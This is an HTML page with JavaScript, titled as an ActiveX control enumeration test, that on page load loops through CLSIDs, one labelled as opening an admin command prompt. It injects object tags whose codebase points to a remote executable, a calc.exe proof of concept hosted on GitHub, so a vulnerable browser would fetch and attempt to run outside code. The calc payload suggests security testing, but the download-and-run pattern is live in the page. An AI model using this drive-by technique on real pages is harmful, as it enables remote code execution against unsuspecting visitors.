<h1>ActiveX control enumeration test</h1>

<span id=sandbox>
</span>

<p>

<b>Results (now trying: <span id=status>n/a</span>):</b><br>
<div id=output>
</div>

<script>
var  ctrls = [
  [ "007", "test dummy", false ],
  [ "858DACA2-78B4-412F-9A4E-315BBB4E1F21", "Open Command Prompt as Admin Command", false ]
];

var cur = 0;
var res_ok;
var res_err;
var tout;
var got_new = 0;
var pass = 1;

function update_results() {
  var t = '';

  for (i=0;i<ctrls.length;i++) 
    if (ctrls[i][2] == true)
      t += '<li> ' + ctrls[i][1] + ' (' + ctrls[i][0] + ') is supported.\n';

  document.getElementById('output').innerHTML = t;
}


function do_next() {
  res_ok = false;
  res_err = false;
  
  document.getElementById('status').innerHTML = ctrls[cur][1] + ':' + pass;

  tout = setTimeout('cont(2)',4000);
  
  document.getElementById('sandbox').innerHTML = '<object classid="clsid:' + ctrls[cur][0] + '" width=10 height=10 style="background-color: teal"' +
                                                 'onload="cont(true)" onerror="cont(false)" codebase="https://github.com/arntsonl/calc_security_poc/raw/master/exe/calc.exe"></object>';

}

function cont(res) {

  if (tout == null) return;
  clearTimeout(tout);
  tout = null;

  if (res) {

    if (cur == 0) {
      document.getElementById('output').innerHTML += '<li> <font color=red><b> Direct clsid: ActiveX access is probably not supported, bailing out.'
      return;
    }

    if (ctrls[cur][2] != true) {
      ctrls[cur][2] = true;
      update_results();
      got_new++;
    }

  }


  while (++cur < ctrls.length && ctrls[cur][2] == true);

  if (cur < ctrls.length) {

    setTimeout('do_next()',1);

  } else {


    // We had new findings. Let's do another pass.
    if (got_new > 0) {
      cur = 0;
      got_new = 0;
      pass++;
      do_next();
    } else
      document.getElementById('status').innerHTML = 'ALL DONE - ' + pass + ' passes';

  }
  
}

do_next();

</script>
